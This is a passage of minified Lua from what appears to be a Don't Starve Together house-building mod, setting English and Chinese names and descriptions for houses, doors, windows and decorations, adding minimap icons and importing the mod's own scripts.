here"STRINGS.HUA_RENAME_HOUSE="Rename"STRINGS.CHARACTERS.GENERIC.ACTIONFAIL.HUA_RENAME_HOUSE={NOOWNER="Only the builder can do this"}STRINGS.ACTIONS.HUA_ENTER_HOUSE={HAUNT="haunt",ENTER="Enter"}for ay,W in ipairs(JLCOx_ak)do STRINGS.NAMES[string.upper(W.."_builder")]="Floor"..ay;STRINGS.RECIPE_DESC[string.upper(W.."_builder")]="New floor"end;for WzM,PSx in ipairs(iD1IUx)do STRINGS.NAMES[string.upper(PSx.."_builder")]="WallPaper"..WzM;STRINGS.RECIPE_DESC[string.upper(PSx.."_builder")]="New wallpaper"end;for I=1,12 do STRINGS.NAMES[string.upper("hua_house_interiors_"..I)]="Crazy Potted Plants"STRINGS.RECIPE_DESC[string.upper("hua_house_interiors_"..I)]="Be better to plant in the greenhouse"STRINGS.CHARACTERS.GENERIC.DESCRIBE[string.upper("hua_house_interiors_"..I)]="Mysterious plants from other world"end else STRINGS.NAMES.HUA_PLAYER_HOUSE_RECIPE="蘑菇小屋"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_RECIPE="建一个甜蜜的家吧"STRINGS.NAMES.HUA_PLAYER_HOUSE1_RECIPE="齿轮钟塔"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE1_RECIPE="建一个时尚的家吧"STRINGS.NAMES.HUA_PLAYER_HOUSE_PVZ_RECIPE="疯狂小屋"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_PVZ_RECIPE="歪比歪比,歪比巴卜"STRINGS.NAMES.HUA_PLAYER_HOUSE_TARDIS_RECIPE="塔迪斯"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_TARDIS_RECIPE="时间和空间的相对维度"STRINGS.NAMES.HUA_PLAYER_HOUSE="蘑菇小屋"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE="建一个甜蜜的家吧" STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE="甜甜的小家！"STRINGS.NAMES.HUA_PLAYER_HOUSE1="齿轮钟塔"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE1="建一个时尚的家吧"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE1="转呐转！"STRINGS.NAMES.HUA_PLAYER_HOUSE_PVZ="疯狂小屋"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_PVZ="歪比歪比,歪比巴卜"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE_PVZ="歪比歪比,歪比巴卜"STRINGS.NAMES.HUA_PLAYER_HOUSE_TARDIS="塔迪斯"STRINGS.NAMES.HUA_PLAYER_HOUSE_TARDIS_FAKE="塔迪斯"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_TARDIS="时间和空间的相对维度"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE_TARDIS="里面比外面大！"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE_TARDIS_TELEPORTING="不论到哪里，那个声音都带来希望"STRINGS.NAMES.HUA_HOUSE_NAMED_ITEM="房屋改名券"STRINGS.RECIPE_DESC.HUA_HOUSE_NAMED_ITEM="自定义房屋名字"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_HOUSE_NAMED_ITEM="给你的房子取一个别致的名字吧"STRINGS.NAMES.HUA_PHONOGRAPH="疯狂的留声机"STRINGS.RECIPE_DESC.HUA_PHONOGRAPH="听着让我想种更多点植物了"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PHONOGRAPH="听着让我想种更多点植物了"STRINGS.NAMES.HUA_ZOMBIES_BUILDER="僵尸"STRINGS.RECIPE_DESC.HUA_ZOMBIES_BUILDER="没事别怕，他不会动"STRINGS.NAMES.HUA_ZOMBIES="僵尸"STRINGS.RECIPE_DESC.HUA_ZOMBIES="没事别怕，他不会动"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_ZOMBIES="你有本事吃了我的脑子呀"STRINGS.NAMES.HUA_WINDOW_ROUND="圆形窗户"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WINDOW_ROUND="让光线透进来"STRINGS.NAMES.HUA_WINDOW_PUNK="窗户"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WINDOW_PUNK="让光线透进来"STRINGS.NAMES.HUA_DOOR_EXIT="门"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_DOOR_EXIT="离开房子"STRINGS.NAMES.HUA_DOOR_EXIT1="门" STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_DOOR_EXIT1="离开房子"STRINGS.NAMES.HUA_DOOR_EXIT2="门"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_DOOR_EXIT2="离开房子"STRINGS.NAMES.HUA_DOOR_EXIT3="门"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_DOOR_EXIT3="离开房子"STRINGS.NAMES.HUA_WALL_DECALS="蘑菇柱子"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS="它真结实"STRINGS.NAMES.HUA_WALL_DECALS_IN="蘑菇柱子"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_IN="它真结实"STRINGS.NAMES.HUA_WALL_DECALS1="柱子"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS1="它真结实"STRINGS.NAMES.HUA_WALL_DECALS1_IN="柱子"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS1_IN="它真结实"STRINGS.NAMES.HUA_WALL_DECALS_PVZ="柱子"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_PVZ="它真结实"STRINGS.NAMES.HUA_WALL_DECALS_PVZ_IN="柱子"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_PVZ_IN="它真结实"STRINGS.NAMES.HUA_WALL_DECALS_TARDIS="柱子"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_TARDIS="它真结实"STRINGS.NAMES.HUA_WALL_DECALS_TARDIS_IN="柱子"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_TARDIS_IN="它真结实"STRINGS.NAMES.HUA_WALL_DECALS_ZHU1="塔迪斯控制台"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_ZHU1="我希望博士在这。"STRINGS.NAMES.HUA_WALL_DECALS_ZHU2="塔迪斯控制台"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_ZHU2="我希望博士在这。"STRINGS.NAMES.HUA_LIGHT_RED="吊灯"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_LIGHT_RED="漂亮的吊灯"STRINGS.NAMES.HUA_LIGHT_RED1="吊灯"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_LIGHT_RED1="漂亮的吊灯"STRINGS.NAMES.HUA_LIGHT_RED2="吊灯"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_LIGHT_RED2="漂亮的吊灯" STRINGS.HUAHOUSEMAX="我不能建造更多的房子"STRINGS.ENTER_HUA_HOUSE="进入"STRINGS.HUA_RENAME_HOUSE="重命名"STRINGS.NOHOUSEPURPLESTAFF="我不能在这里使用它"STRINGS.CHARACTERS.GENERIC.ACTIONFAIL.HUA_RENAME_HOUSE={NOOWNER="只有建造者才可以命名"}STRINGS.ACTIONS.HUA_ENTER_HOUSE={HAUNT="作祟",ENTER="进入"}for wnA,cW in ipairs(JLCOx_ak)do STRINGS.NAMES[string.upper(cW.."_builder")]="新地板"..wnA;STRINGS.RECIPE_DESC[string.upper(cW.."_builder")]="新地板"end;for PHpCof2,bUPpn4T2 in ipairs(iD1IUx)do STRINGS.NAMES[string.upper(bUPpn4T2 .."_builder")]="新墙纸"..PHpCof2;STRINGS.RECIPE_DESC[string.upper(bUPpn4T2 .."_builder")]="新墙纸"end;for sode=1,12 do STRINGS.NAMES[string.upper("hua_house_interiors_"..sode)]="疯狂的盆栽"STRINGS.RECIPE_DESC[string.upper("hua_house_interiors_"..sode)]="温室里就该种这个！"STRINGS.CHARACTERS.GENERIC.DESCRIBE[string.upper("hua_house_interiors_"..sode)]="来自其他时空的神秘植物"end end;TUNING.HUA_HOUSE_HAMMER=GetModConfigData("HouseHammered")AddMinimapAtlas("images/map_icons/hua_player_house.xml")AddMinimapAtlas("images/map_icons/hua_player_house1.xml")AddMinimapAtlas("images/map_icons/hua_player_house_pvz.xml")AddMinimapAtlas("images/map_icons/hua_player_house_tardis.xml")modimport"scripts/hua_house_named.lua"if GetModConfigData("Tardis")==true then modimport"tardis.lua"end